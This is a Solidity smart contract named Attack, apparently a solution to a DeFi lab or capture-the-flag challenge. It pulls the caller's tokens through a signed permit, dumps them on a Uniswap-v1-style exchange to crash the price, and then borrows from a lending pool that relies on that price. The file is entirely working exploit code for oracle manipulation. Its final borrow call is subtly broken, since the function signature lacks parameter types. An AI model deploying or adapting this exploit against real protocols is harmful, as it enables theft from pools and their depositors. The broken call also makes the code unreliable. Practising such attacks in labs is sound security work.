// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface IUniswap {
    function tokenToEthSwapInput(
        uint256 tokensSold,
        uint256 minEth,
        uint256 deadline
    ) external returns (uint256);

    function ethToTokenSwapInput(
        uint256 minTokens,
        uint256 deadline
    ) external payable returns (uint256);
}

contract Attack {
    using Address for address;

    address private tokenAddress;
    address private poolAddress;
    address private swapAddress;
    uint8 private v;
    bytes32 private r;
    bytes32 private s;

    constructor(
        address _tokenAdress,
        address _poolAddress,
        address _swapAddress,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) {
        tokenAddress = _tokenAdress;
        poolAddress = _poolAddress;
        swapAddress = _swapAddress;
        v = _v;
        r = _r;
        s = _s;
    }

    function attack(uint tokenAmount) external payable {
        //transfer token
        uint deadline = type(uint).max;

        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
                msg.sender,
                address(this),
                tokenAmount,
                deadline,
                v,
                r,
                s
            )
        );

        console.log("permit done");

        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                address(this),
                tokenAmount
            )
        );
        console.log("transfer done ");

        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                swapAddress,
                type(uint256).max
            )
        );
        console.log("approve done");
        //swap token to eth

        // swapAddress.functionCall(
        //     abi.encodeWithSignature(
        //         "tokenToEthSwapInput(uint256,uint256,uint256)",
        //         tokenAmount,
        //         1,
        //         deadline
        //     )
        // );
        IUniswap(swapAddress).tokenToEthSwapInput(
            tokenAmount,
            1,
            block.timestamp + 300
        );
        console.log("swap done");
        //borrow token
        poolAddress.functionCall(
            abi.encodeWithSignature("borrow", 10000 * 10 ** 18, msg.sender)
        );
    }
}
